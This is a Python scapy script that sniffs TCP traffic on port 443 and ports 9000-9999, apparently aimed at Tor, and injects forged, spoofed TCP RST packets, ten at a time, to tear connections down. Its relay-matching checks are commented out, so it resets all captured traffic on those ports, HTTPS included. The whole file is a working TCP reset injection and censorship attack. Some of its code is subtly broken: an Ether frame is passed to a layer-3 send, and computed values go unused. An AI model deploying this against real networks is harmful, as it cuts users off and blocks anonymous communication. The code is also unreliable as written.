from scapy.all import sniff, IP, TCP, UDP, Ether, Raw, send, sendpfast, sendp

known_Tor_relays = "tor_ip_list.txt"
tor_ips = []
with open(known_Tor_relays) as f:
    for line in f:
        tor_ips.append(line.strip())

def inspect(packet):
    
    if not (IP in packet and TCP in packet):
        return
    
    #Gather the relevant information from the current packet that
    #has been flagged as tor traffic for utilizing ports 9000-9999:
    interface = "enp0s9"
    
    #Gather the link-layer info:
    srcmac = packet[Ether].src
    dstmac = packet[Ether].dst
    
    #Gather the network-layer info:
    src = packet[IP].src
    dst = packet[IP].dst
    
    #Gather the transport-layer info:
    sourceport = packet[TCP].sport
    destport = packet[TCP].dport
    
    #Get the sequence number for our forged packet:
    seq = packet[TCP].ack
    ack = packet[TCP].seq + len(packet[TCP].payload)
    flags = packet[TCP].flags
    
    if flags & 0x04:
        return
    
    #Check if the packet meets the criteria for a reset. If it does not, just return.
    #ninethousandrange = (9000 <= sourceport <= 9999) or (9000 <= destport <= 9999)
    #known443relay = ((sourceport == 443 or destport == 443) and (src in tor_ips or dst in tor_ips))
    
    #if (not (ninethousandrange or known443relay)):
    #    return
    
    #Otherwise, keep going and forge a RST response:
    print("----------------------------------------------------------")
    if sourceport == 443:
        print("KNOWN RELAY DETECTED: " + str(src) + ":" + str(sourceport))
    else:
        print("TOR TRAFFIC DETECTED: " + str(src) + ":" + str(sourceport))
    print("PACKET: [", end="")
    print(packet,end="")
    print("]")
    
    #Craft an RST packet to be injected by swapping the SRC and DST values (set RST flag as well):
    if packet[TCP].ack != 0:
        rstseq = packet[TCP].ack
    else:
        rstseq = 0
    
    rstpacket = (
        Ether(src=dstmac, dst=srcmac) /
        IP(src=dst, dst=src) /
        TCP(sport=destport, dport=sourceport, flags="R", seq=rstseq)
    )
    
    for i in range(10):
        send(rstpacket, iface=interface, verbose=False)
    
    print("RST packet sent to: " + src)
    print("----------------------------------------------------------\n")
    return

print("Starting Session. Press ctrl-C to exit...")
sniff(iface="enp0s9",filter='tcp port 443 or tcp portrange 9000-9999', prn=inspect, store=False)